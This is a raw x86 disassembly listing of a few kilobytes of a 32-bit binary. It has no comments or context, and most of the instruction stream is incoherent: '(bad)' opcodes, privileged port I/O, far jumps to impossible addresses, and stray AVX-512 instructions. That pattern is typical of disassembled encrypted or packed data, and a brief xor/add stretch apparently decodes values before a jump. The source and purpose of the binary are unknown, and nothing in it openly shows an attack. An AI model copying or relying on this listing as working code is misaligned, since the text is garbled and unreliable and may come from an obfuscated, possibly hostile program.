  40a89b:	int    0xe2
  40a89d:	popa   
  40a89e:	xor    ch,BYTE PTR [ecx-0x1dbc3c14]
  40a8a4:	iret   
  40a8a5:	or     eax,0x447827e2
  40a8aa:	mov    edi,0x5aba6e0
  40a8af:	push   ebp
  40a8b0:	xchg   ebx,eax
  40a8b1:	or     BYTE PTR [bx+si-0x46],bh
  40a8b5:	xor    eax,0x5e247628
  40a8ba:	ret    
  40a8bb:	mov    esp,0xd0cc10d
  40a8c0:	out    0x0,eax
  40a8c2:	inc    ebp
  40a8c3:	cwde   
  40a8c4:	mov    edi,0xbecc03cb
  40a8c9:	scas   eax,DWORD PTR es:[edi]
  40a8ca:	push   esi
  40a8cb:	inc    eax
  40a8cc:	dec    edx
  40a8cd:	xor    al,0x8a
  40a8cf:	sub    bl,BYTE PTR [ebp+0x3b]
  40a8d2:	(bad)  
  40a8d3:	pop    ss
  40a8d4:	pop    ebx
  40a8d5:	sub    al,0xc5
  40a8d7:	popf   
  40a8d8:	cdq    
  40a8d9:	test   DWORD PTR [eax-0x38dfb35a],eax
  40a8df:	rcr    DWORD PTR [edi],1
  40a8e1:	and    ah,cl
  40a8e3:	mov    WORD PTR cs:[esi+0x6a8be3b4],ss
  40a8ea:	push   dx
  40a8ec:	es ret 
  40a8ee:	(bad)  
  40a8ef:	stos   BYTE PTR es:[edi],al
  40a8f0:	cmp    al,0x3b
  40a8f2:	retf   0xfebd
  40a8f5:	int    0x27
  40a8f7:	cmp    al,0x5e
  40a8f9:	sbb    ch,bh
  40a8fb:	je     0x40a8c2
  40a8fd:	jmp    DWORD PTR [eax-0x28]
  40a901:	(bad)  
  40a903:	xchg   ebp,eax
  40a904:	clc    
  40a905:	test   eax,0x7dae9eea
  40a90a:	xor    BYTE PTR [edx+0x2dc31741],ch
  40a910:	call   0x77663a12
  40a915:	dec    esp
  40a916:	jmp    0x40a8ef
  40a918:	cmp    ch,bl
  40a91a:	mov    eax,0xe5df7ab2
  40a91f:	int    0x36
  40a921:	mov    ds:0x3c7db80c,eax
  40a926:	or     al,0x14
  40a928:	jne    0x40a8c0
  40a92a:	retf   0xcdcd
  40a92d:	pop    ecx
  40a92e:	ja     0x40a949
  40a930:	cmp    BYTE PTR [esi+0x6c0f324],al
  40a936:	sub    cl,BYTE PTR [edx-0x26]
  40a939:	lods   al,BYTE PTR ds:[esi]
  40a93a:	push   cs
  40a93b:	test   DWORD PTR [edx-0x6c],eax
  40a93e:	cwde   
  40a93f:	ret    
  40a940:	dec    eax
  40a941:	jmp    0x40a916
  40a943:	rep outs dx,BYTE PTR ds:[esi]
  40a945:	hlt    
  40a946:	test   DWORD PTR [esi],eax
  40a948:	das    
  40a949:	pop    es
  40a94a:	cmp    al,0x3e
  40a94c:	mov    ch,0xd5
  40a94e:	mov    ah,0x15
  40a950:	pop    edx
  40a951:	xchg   ebx,eax
  40a952:	inc    edx
  40a953:	or     bh,BYTE PTR [ebp-0x5352c6ab]
  40a959:	enter  0xec3e,0x4a
  40a95d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a95e:	leave  
  40a95f:	popf   
  40a960:	mov    edi,DWORD PTR [edi]
  40a962:	pop    es
  40a963:	inc    ecx
  40a964:	(bad)  
  40a965:	jns    0x40a9a9
  40a967:	inc    edx
  40a968:	dec    eax
  40a969:	in     al,dx
  40a96a:	rol    BYTE PTR [edi],0xb6
  40a96d:	ret    0x24eb
  40a970:	sbb    DWORD PTR [ecx-0x5706cf23],ebx
  40a976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a977:	mov    ds:0x879e8a52,al
  40a97c:	jb     0x40a910
  40a97e:	cmp    cl,BYTE PTR [ebx-0x501bbca]
  40a984:	(bad)  
  40a986:	inc    edi
  40a987:	lea    eax,[edx-0x76e31975]
  40a98d:	bound  si,DWORD PTR [edx+0x34]
  40a991:	xor    DWORD PTR [edx+ecx*1],eax
  40a994:	test   DWORD PTR ss:[ecx+0x71463545],ebx
  40a99b:	jg     0x40a9eb
  40a99d:	repz mov ecx,0xcc284c27
  40a9a3:	sub    bl,cl
  40a9a5:	inc    esp
  40a9a6:	pop    esi
  40a9a7:	dec    ecx
  40a9a8:	jno    0x40a9d0
  40a9aa:	fiadd  WORD PTR [ecx-0x58152ba5]
  40a9b0:	xchg   edx,eax
  40a9b1:	mov    esi,0xaa1dd71e
  40a9b6:	pushf  
  40a9b7:	fiadd  DWORD PTR [ebp-0x56852265]
  40a9bd:	fistp  DWORD PTR ds:0x68dcf991
  40a9c3:	scas   eax,DWORD PTR es:[edi]
  40a9c4:	rcr    BYTE PTR ds:0xed7fd0e3,0x9f
  40a9cb:	(bad)  
  40a9cc:	mov    esp,0xd15ac563
  40a9d1:	aaa    
  40a9d2:	inc    ebp
  40a9d3:	cmc    
  40a9d4:	lahf   
  40a9d5:	adc    ebx,DWORD PTR [edi]
  40a9d7:	std    
  40a9d8:	xor    dh,BYTE PTR [ebp+0x45323e36]
  40a9de:	lods   al,BYTE PTR ds:[esi]
  40a9df:	push   es
  40a9e0:	(bad)  
  40a9e1:	xlat   BYTE PTR ds:[ebx]
  40a9e2:	dec    ebp
  40a9e3:	je     0x40a968
  40a9e5:	pusha  
  40a9e6:	test   eax,0xf8eb3b0
  40a9eb:	push   esi
  40a9ec:	jecxz  0x40aa05
  40a9ee:	call   0x58b8:0x5aa0272f
  40a9f5:	mov    dh,0x6a
  40a9f7:	inc    esp
  40a9f8:	push   es
  40a9f9:	scas   al,BYTE PTR es:[edi]
  40a9fa:	hlt    
  40a9fb:	call   0xe3eb08db
  40aa00:	and    DWORD PTR [edx-0x4a87ee3f],esp
  40aa06:	dec    ebp
  40aa07:	xchg   ebp,eax
  40aa08:	cmp    al,0x1d
  40aa0a:	xor    ah,BYTE PTR [edi+0x36]
  40aa0d:	jae    0x40aa62
  40aa0f:	or     dh,cl
  40aa11:	cs jbe 0x40aa48
  40aa14:	out    0xf0,al
  40aa16:	in     al,0xd3
  40aa18:	push   es
  40aa19:	lea    esp,[eax+0x42]
  40aa1c:	int    0xc7
  40aa1e:	mov    ?,WORD PTR [eax+0x4c7387db]
  40aa24:	pop    esp
  40aa25:	gs jnp 0x40aa49
  40aa28:	loope  0x40aa2a
  40aa2a:	das    
  40aa2b:	adc    esp,DWORD PTR [ebp-0x65]
  40aa2e:	cmp    esp,DWORD PTR [edx-0x6a12a63c]
  40aa34:	mov    esi,DWORD PTR [ebp+0x68]
  40aa37:	pop    ss
  40aa38:	pop    eax
  40aa39:	mov    dh,0xbb
  40aa3b:	retf   
  40aa3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa3d:	les    esp,FWORD PTR [ebx]
  40aa3f:	mov    esp,0xc7720a46
  40aa44:	nop
  40aa45:	ficomp WORD PTR [esi]
  40aa47:	add    BYTE PTR [edx+0x113c9cb9],bl
  40aa4d:	xchg   esp,eax
  40aa4e:	xor    al,0x40
  40aa50:	push   ss
  40aa51:	cmp    DWORD PTR ds:0x4c4e98f2,0x1356bcc2
  40aa5b:	sbb    BYTE PTR [ebx+0x2efea23d],bl
  40aa61:	mov    ebx,0xc4fc8054
  40aa66:	jp     0x40aa0f
  40aa68:	mov    eax,ds:0xecd05a40
  40aa6d:	push   edx
  40aa6e:	and    BYTE PTR [edx],ch
  40aa70:	mov    al,0xa2
  40aa72:	cwde   
  40aa73:	adc    ebx,DWORD PTR [esp+edi*1]
  40aa76:	inc    edi
  40aa77:	in     eax,dx
  40aa78:	clc    
  40aa79:	and    DWORD PTR [esi-0x71],edi
  40aa7c:	jbe    0x40aadd
  40aa7e:	in     al,dx
  40aa7f:	addr16 jo 0x40aaae
  40aa82:	hlt    
  40aa83:	adc    eax,0x6f0ce955
  40aa88:	mov    eax,0x6d827d2
  40aa8d:	sub    ebx,ebx
  40aa8f:	pop    edx
  40aa90:	xor    eax,ecx
  40aa92:	mov    edx,0x3272db
  40aa97:	add    eax,edx
  40aa99:	mov    DWORD PTR [ebp+0x8],eax
  40aa9c:	mov    eax,DWORD PTR [ebp-0x14]
  40aa9f:	xor    eax,ecx
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0x6e4ca1bc
  40aacc:	xor    BYTE PTR [esp+esi*8+0x62],dl
  40aad0:	bound  edx,QWORD PTR [eax]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0x38]
  40aad6:	int3   
  40aad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aad8:	sbb    eax,0xfbb9e17f
  40aadd:	out    0x48,eax
  40aadf:	cmp    BYTE PTR [edx-0x11e9640d],bh
  40aae5:	xchg   edi,eax
  40aae6:	dec    esi
  40aae7:	xor    al,0xbe
  40aae9:	inc    esp
  40aaea:	mov    esi,0x304a43fa
  40aaef:	jb     0x40aaa5
  40aaf1:	in     al,0x56
  40aaf3:	in     eax,0xde
  40aaf5:	repz repz sbb al,0x11
  40aaf9:	adc    al,0x14
  40aafb:	out    0xb5,eax
  40aafd:	pushf  
  40aafe:	dec    ecx
  40aaff:	in     eax,dx
  40ab00:	mov    ebx,0x260a357b
  40ab05:	jmp    0x40ab24
  40ab07:	rep stos DWORD PTR es:[edi],eax
  40ab09:	(bad)  
  40ab0a:	into   
  40ab0b:	jnp    0x40ab42
  40ab0d:	mov    fs,WORD PTR [ebx]
  40ab0f:	(bad)  
  40ab11:	mov    bh,0x60
  40ab13:	fstp   QWORD PTR [edx-0x1]
  40ab16:	jnp    0x40aad6
  40ab18:	stc    
  40ab19:	sub    dh,BYTE PTR [esi]
  40ab1b:	sbb    ecx,DWORD PTR [esi+0x6af9b856]
  40ab21:	push   ebp
  40ab22:	popf   
  40ab23:	neg    DWORD PTR [eax+0x40]
  40ab26:	xlat   BYTE PTR ds:[ebx]
  40ab27:	cmp    BYTE PTR [ecx],ch
  40ab29:	cdq    
  40ab2a:	leave  
  40ab2b:	adc    DWORD PTR [eax],edi
  40ab2d:	lock sub cl,BYTE PTR [eax+0x564362f1]
  40ab34:	out    dx,al
  40ab35:	and    ebp,ecx
  40ab37:	inc    esi
  40ab38:	add    eax,0xa76cc816
  40ab3d:	pop    ecx
  40ab3e:	enter  0x8508,0x19
  40ab42:	or     ebp,DWORD PTR [edi-0x29]
  40ab45:	mov    edx,eax
  40ab47:	inc    edi
  40ab48:	inc    edx
  40ab49:	xlat   BYTE PTR ds:[ebx]
  40ab4a:	mov    ?,WORD PTR [edx+0x22]
  40ab4d:	cmp    ebp,DWORD PTR [ebx]
  40ab4f:	aas    
  40ab50:	mov    ebp,0x8b093d5a
  40ab55:	pop    ebp
  40ab56:	popf   
  40ab57:	push   ds
  40ab58:	fwait
  40ab59:	or     DWORD PTR [edx],0x26aff018
  40ab5f:	and    edx,edx
  40ab61:	repz js 0x40abc9
  40ab64:	stos   DWORD PTR es:[edi],eax
  40ab65:	dec    ecx
  40ab66:	xchg   DWORD PTR [ebp+ecx*4-0x3a],edx
  40ab6a:	xchg   esp,eax
  40ab6b:	jo     0x40abe8
  40ab6d:	shl    DWORD PTR [ecx-0x54ea4526],0x2
  40ab74:	mov    bl,ch
  40ab76:	lods   eax,DWORD PTR ds:[esi]
  40ab77:	test   al,0x35
  40ab79:	xchg   edx,eax
  40ab7a:	inc    ebp
  40ab7b:	or     cl,bl
  40ab7d:	inc    eax
  40ab7e:	inc    esp
  40ab7f:	lods   eax,DWORD PTR ds:[esi]
  40ab80:	and    eax,0x826cc55a
  40ab85:	mov    ds:0xa9641bab,eax
  40ab8a:	or     DWORD PTR [edi],edx
  40ab8c:	jo     0x40abdb
  40ab8e:	mov    ebx,0x460513e3
  40ab93:	mov    bh,0xfd
  40ab95:	mov    ebp,0xd6a0717f
  40ab9a:	sub    bl,BYTE PTR [eax-0x15]
  40ab9d:	vmaxpd xmm3{k6},xmm7,QWORD PTR [esi+0x70]{1to2}
  40aba4:	mov    ds:0xb7d3634,al
  40aba9:	loope  0x40ac21
  40abab:	(bad)  
  40abac:	test   BYTE PTR ds:0x69b62fb6,0x44
  40abb3:	mov    esi,0xb8f30a28
  40abb8:	mov    dh,0x6e
  40abba:	outs   dx,DWORD PTR ds:[esi]
  40abbb:	xor    esp,DWORD PTR [ebx-0x755cd21b]
  40abc1:	out    0x3,eax
  40abc3:	daa    
  40abc4:	mov    ebx,0x22c80449
  40abc9:	mov    ds,WORD PTR [ebx-0x7b210a5b]
  40abcf:	cdq    
  40abd0:	stos   BYTE PTR es:[edi],al
  40abd1:	popa   
  40abd2:	xchg   esp,eax
  40abd3:	mov    ebp,0x1c27de8b
  40abd8:	fcmovnbe st,st(7)
  40abda:	dec    esi
  40abdb:	mov    dh,0x60
  40abdd:	push   edi
  40abde:	xchg   ebp,eax
  40abdf:	jg     0x40abe1
  40abe1:	aam    0x2b
  40abe3:	sbb    al,0x33
  40abe5:	fld    DWORD PTR [eax]
  40abe7:	fidiv  DWORD PTR [edi+0x4f716850]
  40abed:	jg     0x40abdf
  40abef:	sub    BYTE PTR [esi],bh
  40abf1:	aas    
  40abf2:	push   ebx
  40abf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abf4:	in     al,0xa7
  40abf6:	in     eax,dx
  40abf7:	fs push esi
  40abf9:	ret    
  40abfa:	pop    edx
  40abfb:	outs   dx,BYTE PTR ds:[esi]
  40abfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abfd:	cwde   
  40abfe:	ret    0x39bd
  40ac01:	mov    cl,0x58
  40ac03:	sbb    BYTE PTR [edi-0x140d7758],cl
  40ac09:	pop    esp
  40ac0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac0b:	xor    bl,dl
  40ac0d:	outs   dx,BYTE PTR ds:[esi]
  40ac0e:	(bad)  [esi]
  40ac10:	dec    esp
  40ac11:	not    BYTE PTR ds:0x83d1313d
  40ac17:	ins    DWORD PTR es:[edi],dx
  40ac18:	push   esp
  40ac19:	xor    BYTE PTR [edx+0x79cf18df],ah
  40ac1f:	clc    
  40ac20:	sub    eax,0x3cd51068
  40ac25:	sbb    ah,cl
  40ac27:	dec    eax
  40ac28:	cmp    al,0x2c
  40ac2b:	fild   QWORD PTR [ecx]
  40ac2d:	adc    DWORD PTR [eax],esp
  40ac2f:	cmp    al,0x25
  40ac31:	imul   ebx,DWORD PTR [edi-0x15],0xea89617b
  40ac38:	xchg   BYTE PTR [esi],ah
  40ac3a:	jne    0x40ac23
  40ac3c:	push   es
  40ac3d:	cmc    
  40ac3e:	pop    ds
  40ac3f:	xchg   esi,eax
  40ac40:	or     al,0x42
  40ac42:	xor    esi,DWORD PTR [esi-0x7b]
  40ac45:	xchg   al,dl
  40ac47:	add    DWORD PTR [ecx],0xaca74e77
  40ac4d:	push   DWORD PTR [ecx]
  40ac4f:	cli    
  40ac50:	mov    esi,ecx
  40ac52:	loopne 0x40ac70
  40ac54:	out    0x9b,al
  40ac56:	aad    0x4b
  40ac58:	mov    ch,0x18
  40ac5a:	mov    WORD PTR ds:0xf3f93efc,?
  40ac60:	dec    ecx
  40ac61:	or     eax,0x5b3fbc71
  40ac66:	dec    ebx
  40ac67:	jecxz  0x40acb1
  40ac69:	scas   eax,DWORD PTR es:[edi]
  40ac6a:	dec    esp
  40ac6b:	outs   dx,DWORD PTR ds:[esi]
  40ac6c:	adc    BYTE PTR [edx-0x18],ah
  40ac6f:	xor    BYTE PTR [ecx-0x49],ch
  40ac72:	in     eax,dx
  40ac73:	sub    DWORD PTR [edi-0x2e],0x1f1cd976
  40ac7a:	scas   eax,DWORD PTR es:[edi]
  40ac7b:	retf   0x5860
  40ac7e:	add    esi,edx
  40ac80:	xor    ch,BYTE PTR [ebx+0xd]
  40ac83:	inc    edx
  40ac84:	jmp    0xf417:0xd9424ad5
  40ac8b:	dec    esi
  40ac8c:	cli    
  40ac8d:	inc    ebp
  40ac8e:	(bad)  
  40ac8f:	fsub   st,st(0)
  40ac91:	test   eax,0xa5130ec8
  40ac96:	sub    DWORD PTR [edi+0x7852b569],esp
  40ac9c:	inc    edi
  40ac9d:	sub    edi,ecx
  40ac9f:	mov    bh,0x50
  40aca1:	xlat   BYTE PTR ds:[ebx]
  40aca2:	add    DWORD PTR [esi-0x20],esp
  40aca5:	cdq    
  40aca6:	cs repz fstp st(0)
  40acaa:	das    
  40acab:	xchg   ebx,eax
  40acac:	imul   BYTE PTR ds:0x6ddc19b2
  40acb2:	shl    DWORD PTR [esi+ebp*8+0x6a425d38],0xc7
  40acba:	push   esi
  40acbb:	lods   al,BYTE PTR ds:[esi]
  40acbc:	jb     0x40ac69
  40acbe:	jmp    0x6ac9a2ed
  40acc3:	stos   DWORD PTR es:[edi],eax
  40acc4:	mov    cl,0x30
  40acc6:	dec    edi
  40acc7:	les    ebx,FWORD PTR [esi+eax*1]
  40acca:	fisub  WORD PTR [edx-0x331f7b4d]
  40acd0:	int    0x36
  40acd2:	mov    DWORD PTR [ebp-0x5e9c087b],ebx
  40acd8:	bound  esp,QWORD PTR [eax-0x57]
  40acdb:	arpl   WORD PTR [ecx-0x13],bx
  40acde:	mov    edi,0x3e6113f2
  40ace3:	loope  0x40ad43
  40ace5:	addr16 out 0x4d,eax
  40ace8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ace9:	xchg   ebp,eax
  40acea:	jmp    0x187cf04b
  40acef:	dec    ebp
  40acf0:	call   0xae75c1ec
  40acf5:	jmp    0x40ac85
  40acf7:	jo     0x40ad63
  40acf9:	ins    BYTE PTR es:[edi],dx
  40acfa:	xchg   edi,eax
  40acfb:	sbb    edi,esp
  40acfd:	mov    cl,0xd4
  40acff:	xor    eax,0x7bed625f
  40ad04:	mov    eax,0xf7a947ab
  40ad09:	int3   
  40ad0a:	test   BYTE PTR [ebx-0x66],al
  40ad0d:	push   0x33
  40ad0f:	pop    esp
  40ad10:	xchg   ebx,eax
  40ad11:	outs   dx,DWORD PTR ds:[esi]
  40ad12:	std    
  40ad13:	scas   al,BYTE PTR es:[edi]
  40ad14:	and    DWORD PTR [edi-0x5f],edx
  40ad17:	lods   eax,DWORD PTR ds:[esi]
  40ad18:	dec    edi
  40ad19:	lods   al,BYTE PTR ds:[esi]
  40ad1a:	cdq    
  40ad1b:	enter  0x774a,0xcd
  40ad1f:	and    BYTE PTR [ecx-0xa],dl
  40ad22:	or     ecx,DWORD PTR [esi-0x64]
  40ad25:	inc    edx
  40ad26:	xor    bl,BYTE PTR [ecx-0x27]
  40ad29:	dec    ebp
  40ad2a:	jg     0x40ad40
  40ad2c:	stos   DWORD PTR es:[edi],eax
  40ad2d:	fsubr  QWORD PTR [eax]
  40ad2f:	or     BYTE PTR [edx+0x6aaa960e],al
  40ad35:	cmp    eax,0x3ad05df4
  40ad3a:	mov    ch,0xfd
  40ad3c:	jmp    0x1f8a0ccc
  40ad41:	sahf   
  40ad42:	pop    ebp
  40ad43:	mov    cl,BYTE PTR [esi-0x15]
  40ad46:	mov    bl,0x79
  40ad48:	adc    ebx,edi
  40ad4a:	pop    ecx
  40ad4b:	dec    edx
  40ad4c:	fdivr  DWORD PTR [esi-0x240e08df]
  40ad52:	(bad)  
  40ad53:	xor    al,0x10
  40ad55:	sbb    al,0xdb
  40ad57:	repnz push ss
  40ad59:	fsubp  st(0),st
  40ad5b:	int    0x20
  40ad5d:	repnz dec esp
  40ad5f:	jb     0x40ad65
  40ad61:	bound  esp,QWORD PTR [esi-0x5925e080]
  40ad67:	and    BYTE PTR [edi+0x4ab938eb],bh
  40ad6d:	mov    ds:0xf8cc1c57,eax
  40ad72:	jp     0x40adc1
  40ad74:	xchg   esi,eax
  40ad75:	or     DWORD PTR [eax+edx*4-0x25d32d9b],0x5
  40ad7d:	jae    0x40ad63
  40ad7f:	shr    BYTE PTR [eax+0x6049ef44],0x97
  40ad86:	jbe    0x40adb1
  40ad88:	into   
  40ad89:	jle    0x40ad3a
  40ad8b:	daa    
  40ad8c:	push   ebp
  40ad8d:	push   esi
  40ad8e:	ret    
  40ad8f:	mov    ebx,0x5be4b9fd
  40ad94:	mov    ebp,0x681502e5
  40ad99:	arpl   WORD PTR [esi],bp
  40ad9b:	add    DWORD PTR ds:0xb72511f1,ecx
  40ada1:	push   edi
  40ada2:	jmp    0x550d:0x45fd2aa0
  40ada9:	cmp    ecx,DWORD PTR [eax+0x68]
  40adac:	or     al,0xd8
  40adae:	out    0x22,al
  40adb0:	cmp    eax,0x1ccbb642
  40adb5:	jge    0x40ada4
  40adb7:	inc    esp
  40adb8:	pop    esi
  40adb9:	sub    DWORD PTR [edx],edi
  40adbb:	cmp    al,0x15
  40adbd:	push   0xe502061c
  40adc2:	push   0xc144b246
  40adc7:	jo     0x40ae3d
  40adc9:	cmp    DWORD PTR [edi],esp
  40adcb:	pop    ss
  40adcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adcd:	xor    al,0x29
  40adcf:	or     DWORD PTR [edx-0x45248ac5],ecx
  40add5:	mov    ecx,0x4f59866b
  40adda:	stos   BYTE PTR es:[edi],al
  40addb:	call   0x1024c6d3
  40ade0:	fldcw  WORD PTR [ebx]
  40ade2:	call   0xcacb:0xc1d66164
  40ade9:	sbb    eax,0x43cac210
  40adee:	add    esp,esp
  40adf0:	aam    0xac
  40adf2:	les    edx,FWORD PTR [ebx-0x48]
  40adf5:	cpuid  
  40adf7:	nop
  40adf8:	pop    ecx
  40adf9:	arpl   WORD PTR [eax],cx
  40adfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adfc:	lock xchg ebx,eax
  40adfe:	sub    al,BYTE PTR [esp+ecx*4+0x46]
  40ae02:	add    DWORD PTR [ebp-0x13],eax
  40ae05:	(bad)  
  40ae06:	enter  0xcc59,0xb3
  40ae0a:	dec    ecx
  40ae0b:	jo     0x40adc8
  40ae0d:	and    DWORD PTR [esi],eax
  40ae0f:	sti    
  40ae10:	fstp   st(6)
  40ae12:	pop    ecx
  40ae13:	lods   eax,DWORD PTR ds:[esi]
  40ae14:	lahf   
  40ae15:	and    eax,0x22048f70
  40ae1a:	and    al,0x1f
  40ae1c:	ins    DWORD PTR es:[edi],dx
  40ae1d:	xor    al,0xbb
  40ae1f:	push   edi
  40ae20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae21:	mov    ah,BYTE PTR [esi+0x7f]
  40ae24:	mov    ecx,esi
  40ae26:	test   esi,eax
  40ae28:	jl     0x40ae5c
  40ae2a:	fwait
  40ae2b:	sahf   
  40ae2c:	and    eax,0xb3de90ed
  40ae31:	fisub  DWORD PTR [esi-0x15]
  40ae34:	dec    eax
  40ae35:	dec    eax
  40ae36:	and    bh,dl
  40ae38:	sub    al,0xf5
  40ae3a:	add    eax,ebp
  40ae3c:	in     al,0xdd
  40ae3e:	shr    BYTE PTR [eax],cl
  40ae40:	jne    0x40ae2d
  40ae42:	stos   DWORD PTR es:[edi],eax
  40ae43:	jb     0x40ae45
  40ae45:	mov    bl,0xbf
  40ae47:	mov    ds:0xfee6b247,eax
  40ae4c:	std    
  40ae4d:	lea    ebp,[ebp-0x2e6bcb50]
  40ae53:	add    BYTE PTR [ebp-0xe],cl
  40ae56:	xor    DWORD PTR [eax],esi
  40ae58:	push   ds
  40ae59:	dec    ecx
  40ae5a:	retf   
  40ae5b:	scas   eax,DWORD PTR es:[edi]
  40ae5c:	stos   BYTE PTR es:[edi],al
  40ae5d:	sbb    eax,0xc05b00d1
  40ae62:	icebp  
  40ae63:	test   eax,0x6500ee0
  40ae68:	call   0xe31:0xec750428
  40ae6f:	arpl   WORD PTR [esi-0x3b],dx
  40ae72:	adc    al,0x73
  40ae74:	and    ebp,eax
  40ae76:	mov    cs,WORD PTR [ebp-0x40ba8376]
  40ae7c:	push   cs
  40ae7d:	cmp    BYTE PTR [edx+ecx*4+0x46915a7f],dl
  40ae84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae85:	clc    
  40ae86:	xchg   edi,eax
  40ae87:	bound  ebp,QWORD PTR [esi+ecx*2]
  40ae8a:	in     eax,0x95
  40ae8c:	mov    BYTE PTR [ebx+esi*2+0x42b70cdb],al
  40ae93:	pop    ebx
  40ae94:	aad    0x61
  40ae96:	xchg   ecx,eax
  40ae97:	bound  ebx,QWORD PTR [ebp-0x2c]
  40ae9a:	out    0xa1,al
  40ae9c:	cs pop eax
  40ae9e:	inc    ebx
  40ae9f:	jnp    0x40aed2
  40aea1:	mov    dl,0x34
  40aea3:	loop   0x40ae8c
  40aea5:	ins    DWORD PTR es:[edi],dx
  40aea6:	and    eax,0xee70b397
  40aeab:	or     eax,0xea87f5bd
  40aeb0:	pop    esi
  40aeb1:	sub    BYTE PTR [eax],ch
  40aeb3:	test   BYTE PTR [ebp-0x34283409],al
  40aeb9:	cwde   
  40aeba:	lods   al,BYTE PTR ds:[esi]
  40aebb:	shl    DWORD PTR [ebx],0xe4
  40aebe:	push   ds
  40aebf:	fsubr  DWORD PTR [edx+0x76b7b4ea]
  40aec5:	jo     0x40af01
  40aec7:	jecxz  0x40af37
  40aec9:	dec    eax
  40aeca:	cld    
  40aecb:	jne    0x40ae7d
  40aecd:	cwde   
  40aece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aecf:	lock pop es
  40aed1:	cmp    eax,0x7b43e264
  40aed6:	sub    ebp,ecx
  40aed8:	or     BYTE PTR [esi],ah
  40aeda:	(bad)  
  40aedb:	out    dx,al
  40aedc:	jo     0x40ae7b
  40aede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aedf:	inc    ebp
  40aee0:	mov    ebx,0x6384b506
  40aee5:	xchg   esp,eax
  40aee6:	les    esi,FWORD PTR [eax+ebp*4]
  40aee9:	and    al,0x81
  40aeeb:	pcmpgtb mm1,QWORD PTR [eax-0x50]
  40aeef:	mov    fs,WORD PTR [ebx+0x61]
  40aef2:	gs add al,0x52
  40aef5:	mov    al,ds:0x72ac96c1
  40aefa:	leave  
  40aefb:	jl     0x40aeaa
  40aefd:	out    0x94,eax
  40aeff:	lock test al,0x3e
  40af02:	fcmovnu st,st(3)
  40af04:	das    
  40af05:	mov    edx,0x68e3cf6b
  40af0a:	dec    edi
  40af0b:	in     eax,dx
  40af0c:	hlt    
  40af0d:	push   edi
  40af0e:	fnsave es:[esi]
  40af11:	sti    
  40af12:	jns    0x40aeb6
  40af14:	cmp    ecx,esi
  40af16:	cmc    
  40af17:	shr    ebx,0xc8
  40af1a:	sbb    BYTE PTR [esi-0x50],dl
  40af1d:	test   DWORD PTR [ebx+0x47],ebx
  40af20:	xchg   ebx,eax
  40af21:	rcr    BYTE PTR [ebx-0x27157dc7],cl
  40af27:	bound  esp,QWORD PTR [edi+0x57]
  40af2a:	push   DWORD PTR [esi-0x649373a9]
  40af30:	popf   
  40af31:	pop    es
  40af32:	sbb    eax,0xb14db47d
  40af37:	stos   BYTE PTR es:[edi],al
  40af38:	inc    eax
  40af39:	inc    eax
  40af3a:	dec    ecx
  40af3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af3c:	enter  0xbeee,0xf4
  40af40:	loopne 0x40af05
  40af42:	dec    edi
  40af43:	xchg   ebx,eax
  40af44:	cld    
  40af45:	js     0x40aed8
  40af47:	xor    bl,bl
  40af49:	aam    0xee
  40af4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af4c:	xchg   ecx,eax
  40af4d:	mov    esi,DWORD PTR [edx-0x307b5f69]
  40af53:	imul   ecx,ebx,0xffffffa8
  40af56:	dec    esp
  40af57:	jnp    0x40af67
  40af59:	adc    DWORD PTR [edx+0x3a],edx
  40af5c:	inc    ebx
  40af5d:	push   ds
  40af5e:	repz xor DWORD PTR [ecx],edx
  40af61:	jbe    0x40aefe
  40af63:	popf   
  40af64:	mov    edi,gs
  40af66:	xor    eax,0xc7b319b0
  40af6b:	or     al,0x26
  40af6d:	inc    ebp
  40af6e:	push   eax
  40af6f:	mov    bh,0x32
  40af71:	test   DWORD PTR [ebx+edx*1],ebp
  40af74:	mov    cl,0x3d
  40af76:	cmp    cl,dh
  40af78:	fnsave [edx+0x1f]
  40af7b:	stos   DWORD PTR es:[edi],eax
  40af7c:	loop   0x40afb4
  40af7e:	mov    edi,0xeb955215
  40af83:	xor    DWORD PTR [ebx],ebp
  40af85:	sbb    BYTE PTR [eax],ch
  40af87:	ss dec ebx
  40af89:	inc    eax
  40af8a:	mov    bl,dl
  40af8c:	in     al,0x3b
  40af8e:	and    ch,ah
  40af90:	sbb    al,0xac
  40af92:	adc    bl,BYTE PTR [edx-0x6a]
  40af95:	sub    al,0xd1
  40af97:	jae    0x40af97
  40af99:	or     edi,DWORD PTR [edi+edi*2+0x232cdd92]
  40afa0:	ror    DWORD PTR [esi+0x28a698f9],1
  40afa6:	add    DWORD PTR [edx-0x5c],0x78dd1e9f
  40afad:	outs   dx,BYTE PTR ds:[esi]
  40afae:	push   edx
  40afaf:	scas   al,BYTE PTR es:[edi]
  40afb0:	jg     0x40afb8
  40afb2:	jmp    FWORD PTR [eax-0x25]
  40afb5:	sub    eax,0x6e4513c8
  40afba:	and    edi,ebx
